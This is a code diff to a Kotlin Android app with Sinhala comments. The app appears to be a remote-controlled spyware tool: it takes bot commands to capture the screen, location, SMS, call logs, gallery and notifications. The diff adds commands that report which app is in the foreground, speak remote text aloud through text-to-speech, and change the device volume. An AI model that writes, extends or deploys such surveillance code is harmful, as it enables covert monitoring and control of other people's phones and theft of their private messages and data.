@@ -235,6 +235,9 @@ private fun handle(raw: String) {
         cmd == "/livescreen" -> liveScreen(arg.toIntOrNull() ?: 30)
         cmd == "/location" -> location()
         cmd == "/battery" -> battery()
+        cmd == "/apps" -> currentApp()
+        cmd == "/tts" -> tts(arg)
+        cmd.startsWith("/volume") -> volume(arg)
         cmd == "/sms" -> sms()
         cmd == "/calls" -> calls()
         cmd == "/gallery" -> gallery()
@@ -365,6 +368,9 @@ cmd == "/whatsapp_status" -> {
             "📸 /screen /livescreen [sec]\n" +
             "📍 /location\n" +
             "🔋 /battery\n" +
+            "📱 /apps\n" +
+            "🔊 /volume max/min/mute\n" +
+            "🗣 /tts [msg]\n" +
             "💬 /sms /calls /gallery\n" +
             "📊 /usage\n" +
             "🔔 /notifications\n" +
@@ -716,6 +722,85 @@ cmd == "/whatsapp_status" -> {
             sendMsg("🔋 Battery: $lvl%\n${if (charging) "⚡ Charging" else "Not charging"}")
         } catch (e: Exception) { sendMsg("❌ ${e.message}") }
     }
+    // ===== දැන් open කරලා තියෙන ඇප් එක =====
+private fun currentApp() {
+    try {
+        val usm = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
+        val end = System.currentTimeMillis()
+        val start = end - 60_000L
+        val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_BEST, start, end)
+        if (stats == null || stats.isEmpty()) {
+            sendMsg("❌ Usage stats නෑ. Usage Access ON ද බලන්න.")
+            return
+        }
+        val recent = stats.filter { it.lastTimeUsed > 0 }.maxByOrNull { it.lastTimeUsed }
+        if (recent != null) {
+            val pm = packageManager
+            val name = try {
+                pm.getApplicationLabel(pm.getApplicationInfo(recent.packageName, 0)).toString()
+            } catch (_: Exception) { recent.packageName }
+            val time = SimpleDateFormat("hh:mm:ss a", Locale.getDefault()).format(Date(recent.lastTimeUsed))
+            sendMsg("📱 දැන් open: $name\n🕐 $time\n🔗 ${recent.packageName}")
+        } else {
+            sendMsg("❌ දැන් open කරලා තියෙන ඇප් එකක් හොයාගන්න බෑ")
+        }
+    } catch (e: Exception) {
+        sendMsg("❌ ${e.message}")
+    }
+}
+
+// ===== TTS =====
+private fun tts(message: String) {
+    if (message.isEmpty()) {
+        sendMsg("❌ Usage: /tts [message]")
+        return
+    }
+    try {
+        val tts = android.speech.tts.TextToSpeech(this) { status ->
+            if (status == android.speech.tts.TextToSpeech.SUCCESS) {
+                // initialization success
+            }
+        }
+        tts.language = Locale.getDefault()
+        tts.setSpeechRate(0.9f)
+        tts.speak(message, android.speech.tts.TextToSpeech.QUEUE_FLUSH, null, "tts1")
+        sendMsg("🗣 කියවනවා: $message")
+        android.os.Handler(mainLooper).postDelayed({
+            try { tts.shutdown() } catch (_: Exception) {}
+        }, 10000L)
+    } catch (e: Exception) {
+        sendMsg("❌ TTS error: ${e.message}")
+    }
+}
+
+// ===== Volume control =====
+private fun volume(arg: String) {
+    try {
+        val am = getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
+        when (arg.lowercase()) {
+            "max" -> {
+                val max = am.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC)
+                am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC, max, 0)
+                sendMsg("🔊 Volume: MAX ($max)")
+            }
+            "min" -> {
+                am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC, 1, 0)
+                sendMsg("🔉 Volume: MIN")
+            }
+            "mute" -> {
+                am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC, 0, 0)
+                sendMsg("🔇 Volume: MUTED")
+            }
+            else -> {
+                val current = am.getStreamVolume(android.media.AudioManager.STREAM_MUSIC)
+                val max = am.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC)
+                sendMsg("🔊 Volume: $current / $max\n\nUsage:\n/volume max\n/volume min\n/volume mute")
+            }
+        }
+    } catch (e: Exception) {
+        sendMsg("❌ Volume error: ${e.message}")
+    }
+}
 
     private fun sms() {
         try {
